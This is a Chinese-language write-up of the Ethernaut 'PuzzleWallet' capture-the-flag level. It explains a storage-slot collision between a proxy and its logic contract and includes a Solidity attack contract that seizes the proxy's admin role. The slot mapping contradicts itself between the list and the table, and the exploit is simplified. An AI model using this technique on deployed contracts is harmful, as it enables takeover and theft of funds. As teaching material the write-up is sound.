# PuzzleWallet

## Reference
[PuzzleWallet](https://ethernaut.openzeppelin.com/level/24)

[PuzzleWallet.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/24-PuzzleWallet/PuzzleWallet.sol)

## 目标
成为代理合约的 admin 账户

## 分析
### slot
1. `proxy-admin` 地址和 `wallet-maxBalance` 存储在 `slot0`
2. `proxy-pendingAdmin` 地址和 `wallet-owner` 存储在 `slot1`

| Proxy-slot0 | Wallet-slot0 | Proxy-slot1 | Wallet-slot1 |
|----------|--------------|-------------|--------------|
| pendingAdmin         |    owner        |      admin    | maxBalance          | 

3. `Proxy` 合约存储状态，`Wallet` 合约存储逻辑
4. `Wallet` 合约的数据更新不会影响 `Proxy` 合约，因为 `Proxy` 只会使自己合约存储的数据
5. `Proxy` 合约的数据更新会影响 `Wallet` 合约的函数判断，因为 `Proxy` 会把 `Wallet` 合约逻辑拿到 `Proxy EVM` 环境中执行

### maxBalance
1. `Proxy-admin` 地址和 `Wallet-maxBalance` 存储在 `slot0`
2. 如果可以在 `Proxy` 中更新 `slot0->maxBalance(admin)` 数据，就可以实现目标
#### Wallet-setMaxBalance()
`function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted`,函数需要白名单地址才能调用
#### Wallet-addToWhitelist()
```solidity
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }
```
1. 函数需要 `owner` 地址调用
2. 在 `Wallet` 逻辑合约中，`owner` 存储在 `slot0`
3. 对于 `Proxy` 函数调用过程中 `owner` 的判断，也会从 `slot0` 中取数据
4. `Proxy slot0` 中存储的是 `pendingAdmin` 地址而言
#### Proxy-proposeNewAdmin()
```solidity
    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
```
`Proxy` 合约调用 `proposeNewAdmin()` 函数修改 `slot0-pendingAdmin` ，不需要额外的验证，任何地址都可以提交修改。

## 实现逻辑--修改admin为attack()合约地址
1. 部署 `Attack()` 合约，实例化 `Proxy` 和 `Wallet` 合约，将 `Proxy` 合约的 `admin` 地址更新为 `msg.sender`
2. 调用 `Proxy` 合约 `proposeNewAdmin()` 函数，`Attack` 合约地址作为参数传递 --> `Proxy 的slot0 存储 Attack() 合约地址`
3. 在 `Proxy` 合约中调用 `addToWhitelist()` 函数：
   1. `addToWhitelist()` 校验 `owner` 身份，`owner` 存储在 `slot0` 位置
   2. `Proxy` 合约按照 `Wallet` 逻辑，从 `slot0` 取出 `owner` 地址
   3. `slot0` 存储的是 `Attack()` 合约地址，交易发起者也是 `Attack()` 合约， 满足判断条件
4. 在 `Proxy` 合约中调用 `setMaxBalance()` 函数，将 `Attack` 合约地址作为参数传递
   1. `setMaxBalance()` 校验 白名单
   2. 第三步骤将 `Attack` 合约置为白名单，满足条件
   3. `Proxy` 合约按照 `Wallet` 逻辑--> 更新 `slot1` 数据
5. 在 `Proxy` 中读取 `slot1--> Admin` 地址
```solidity
    constructor() {
        pw = new PuzzleWallet();
        pp = new PuzzleProxy(msg.sender, address(pw), "");
    }

    function attack() external returns (address) {
        pp.proposeNewAdmin(address(this));
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("addToWhitelist(address)")),
            address(this)
        );
        address(pp).call(data);
        uint256 value = tovalue(address(this));
        data = abi.encodeWithSelector(
            bytes4(keccak256("setMaxBalance(uint256)")),
            value
        );
        address(pp).call(data);
        return pp.admin();
    }
```
